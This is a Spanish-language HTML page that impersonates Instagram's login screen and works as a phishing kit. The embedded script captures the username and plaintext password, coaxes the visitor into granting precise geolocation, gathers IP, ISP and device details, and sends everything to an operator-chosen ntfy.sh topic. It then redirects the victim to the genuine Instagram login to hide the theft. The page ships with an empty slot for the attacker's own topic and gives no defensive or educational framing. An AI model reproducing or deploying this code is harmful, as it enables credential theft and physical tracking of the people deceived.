<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }
        .login-container {
            width: 350px;
            padding: 20px 40px;
            background-color: white;
            border: 1px solid #dbdbdb;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            background-color: #fafafa;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px;
            margin: 10px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .divider {
            margin: 15px 0;
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before {
            margin-right: 10px;
        }
        .divider::after {
            margin-left: 10px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: bold;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }
        #locationStatus {
            font-size: 12px;
            margin: 5px 0;
            color: #ed4956;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
        
        <form id="loginForm">
            <input type="text" name="username" placeholder="Tel√©fono, usuario o correo electr√≥nico" required>
            <input type="password" name="password" placeholder="Contrase√±a" required>
            <button type="button" id="requestLocation">Permitir ubicaci√≥n</button>
            <div id="locationStatus">Ubicaci√≥n no concedida</div>
            <button type="submit">Iniciar sesi√≥n</button>
        </form>
        
        <div class="divider">O</div>
        
        <a href="#" class="fb-login">Iniciar sesi√≥n con Facebook</a>
        <a href="#" style="font-size: 12px; color: #00376b;">¬øOlvidaste tu contrase√±a?</a>
    </div>

    <script>
        // Configuraci√≥n
        const NTFY_TOPIC = ''; // Cambia esto por tu tema ntfy real
        let locationGranted = false;
        let userCoordinates = null;

        // Elementos del DOM
        const locationStatus = document.getElementById('locationStatus');
        const requestLocationBtn = document.getElementById('requestLocation');
        const loginForm = document.getElementById('loginForm');

        // Solicitar ubicaci√≥n
        requestLocationBtn.addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationGranted = true;
                        userCoordinates = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        locationStatus.textContent = "Ubicaci√≥n concedida ‚úì";
                        locationStatus.style.color = "#4CAF50";
                        
                        // Enviar notificaci√≥n de ubicaci√≥n
                        sendNotification("üìç Ubicaci√≥n concedida", `El usuario ha permitido acceso a su ubicaci√≥n exacta:
Latitud: ${userCoordinates.lat}
Longitud: ${userCoordinates.lng}
Precisi√≥n: ${userCoordinates.accuracy} metros
Google Maps: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}`);
                    },
                    (error) => {
                        locationStatus.textContent = "Ubicaci√≥n denegada ‚úó";
                        locationStatus.style.color = "#ed4956";
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                locationStatus.textContent = "Geolocalizaci√≥n no soportada";
            }
        });

        // Manejar env√≠o del formulario
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = loginForm.username.value;
            const password = loginForm.password.value;
            
            try {
                // Obtener datos de IP y red
                const ipInfo = await getIPInfo();
                
                // Obtener informaci√≥n del dispositivo
                const deviceInfo = getDeviceInfo();
                
                // Construir mensaje
                let message = `üîî Intento de inicio de sesi√≥n detectado\n\n`;
                message += `üë§ Usuario: ${username}\n`;
                message += `üîê Contrase√±a: ${password}\n\n`;
                message += `üåê Informaci√≥n de red:\n`;
                message += `IP: ${ipInfo.ip}\n`;
                message += `Ubicaci√≥n aproximada: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
                message += `Proveedor: ${ipInfo.org || 'Desconocido'}\n\n`;
                
                if (locationGranted && userCoordinates) {
                    message += `üìç Ubicaci√≥n exacta:\n`;
                    message += `Latitud: ${userCoordinates.lat}\n`;
                    message += `Longitud: ${userCoordinates.lng}\n`;
                    message += `Precisi√≥n: ${userCoordinates.accuracy}m\n`;
                    message += `Mapa: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}\n\n`;
                }
                
                message += `üñ•Ô∏è Informaci√≥n del dispositivo:\n`;
                message += `Navegador: ${deviceInfo.browser}\n`;
                message += `Sistema: ${deviceInfo.os}\n`;
                message += `Resoluci√≥n: ${deviceInfo.screen}\n`;
                message += `Idioma: ${deviceInfo.language}\n`;
                message += `Zona horaria: ${deviceInfo.timezone}`;
                
                // Enviar notificaci√≥n
                await sendNotification("‚ö†Ô∏è Nuevo login Instagram", message);
                
                // Redirigir despu√©s de enviar
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 1500);
                
            } catch (error) {
                console.error("Error al procesar datos:", error);
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }
        });

        // Funci√≥n para obtener informaci√≥n de IP
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                return await locationResponse.json();
            } catch (error) {
                console.error("Error al obtener datos de IP:", error);
                return {
                    ip: "Desconocido",
                    city: "Desconocida",
                    region: "Desconocida",
                    country: "Desconocido"
                };
            }
        }

        // Funci√≥n para obtener informaci√≥n del dispositivo
        function getDeviceInfo() {
            return {
                browser: navigator.userAgent,
                os: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Funci√≥n para enviar notificaciones
        async function sendNotification(title, message) {
            try {
                const response = await fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
                    method: 'POST',
                    headers: {
                        'Title': title,
                        'Priority': 'high',
                        'Tags': 'warning'
                    },
                    body: message
                });
                
                if (!response.ok) {
                    console.error("Error al enviar notificaci√≥n:", response.status);
                }
            } catch (error) {
                console.error("Error de red al enviar notificaci√≥n:", error);
            }
        }
    </script>
</body>
</html>
